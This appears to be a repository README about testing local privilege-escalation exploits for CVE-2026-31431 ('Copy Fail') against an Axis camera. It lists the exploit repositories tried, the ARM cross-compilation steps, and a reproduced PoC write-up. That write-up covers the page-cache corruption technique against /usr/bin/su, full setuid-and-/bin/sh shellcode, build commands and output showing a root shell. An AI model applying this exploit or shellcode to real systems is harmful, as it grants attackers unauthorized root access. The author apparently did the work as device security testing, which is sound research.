# ITSA Copy Fail Attempt to Axis Camera

List of repositories I tried:
- https://github.com/tgies/copy-fail-c (C)
- https://github.com/xeloxa/copyfail-exploit (Python)
- https://github.com/astounds/copy-fail-CVE-2026-31431 (Python)
- https://github.com/irongiant33/copyfail# (C)

None of the methods were successful on the Axis camera. The best progress I got is that trying to run `su` on the Axis camera before the exploit would yield an output of "You don't have the permission to do this" and after running the exploit I would get a "Segmentation Fault, Core Dumped"

For Axis cross-compiling, I used two approaches:
- Download the armv7hf Dockerfile from https://github.com/AxisCommunications/acap-native-sdk 
   - locally built with docker build -t axis-armv7 .
   - locally ran with `docker run -it -v C:\Users\samu\Documents\copyfail:/tmp axis-armv7` where the file location is a local mount point where I uploaded the repository code
   - compiled C code with `${CC} sourcefile.c -o outputexecutable` within the Docker container
   - from there, I uploaded the file to GitHub, downloaded on the Raspberry Pi, and scp'ed over to the Axis camera
- Try to run pyinstaller from an armv7l architecture in a Docker container so that it would bundle the Python repositories into a single executable on ARM
    - `docker run --rm --privileged multiarch/qemu-user-static --reset -p yes`
    - `docker run --rm -it --platform linux/arm/v7 -v C:\Users\samue\Documents\copyfail:/tmp arm32v7/python`
    - `pip install pyinstaller && pyinstaller --onefile source.py`
    - Then uploading the file to GitHub, downloading it on the Raspberry Pi, and scp'ed over to the Axis camera

## Copy Fail - CVE-2026-31431 PoC in C

Local privilege escalation exploit for **CVE-2026-31431** (Copy Fail), written in C.


## How It Works

1. **ELF parsing**: resolves `/usr/bin/su`'s entry point virtual address to a file offset via `PT_LOAD` program headers
2. **AF_ALG setup**: binds to `authencesn(hmac(sha256),cbc(aes))` with a zero key
3. **4-byte page cache writes**: for each chunk of the shellcode payload:
   - `sendmsg()` sends AAD with the shellcode bytes as `seqno_lo` (bytes 4-7), with `MSG_MORE`
   - `splice()` delivers 32 bytes of the target file's page cache pages as the AEAD authentication tag
   - `recv()` triggers decryption,`authencesn`'s scratch write lands in the chained page cache pages, writing 4 controlled bytes.
4. **Privilege escalation**: `execl("/usr/bin/su")` loads the corrupted page cache. The 40-byte shellcode (`setuid(0)` + `execve("/bin/sh")`) runs as setuid-root

## Shellcode

```asm
xor    edi, edi            ; uid = 0
mov    eax, 105            ; sys_setuid
syscall
xor    edx, edx            ; envp = NULL
push   rdx                 ; null terminator
movabs rax, "/bin/sh"      ; "/bin/sh\0"
push   rax
mov    rdi, rsp            ; filename
push   rdx                 ; NULL (argv[1])
push   rdi                 ; argv[0]
mov    rsi, rsp            ; argv
mov    eax, 59             ; sys_execve
syscall
```

## Build

Requires `musl-gcc` or any C compiler with static linking support:

```bash
musl-gcc -static -O2 -s -o copyfail exploit.c
```

Alternatively with GCC + glibc:

```bash
gcc -static -O2 -s -o copyfail exploit.c
```

## Usage

```bash
$ ./copyfail
[*] CVE-2026-31431 PoC (Copy Fail)
[*] /usr/bin/su entry @ file offset 0x78
[*] Patching page cache (40 bytes, 10 writes)
..........
[+] Executing /usr/bin/su
# id
uid=0(root) gid=1000(user) groups=1000(user)
```

## References

- [Copy Fail: 732 Bytes to Root on Every Major Linux Distribution](https://xint.io/blog/copy-fail-linux-distributions)
- [Fix commit a664bf3d](https://github.com/torvalds/linux/commit/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [Introduced by commit 72548b093ee3](https://github.com/torvalds/linux/commit/72548b093ee3) (2017)

## Disclaimer

This proof-of-concept is provided for authorized security research and educational purposes only. Unauthorized use against systems you do not own or have explicit permission to test is illegal.
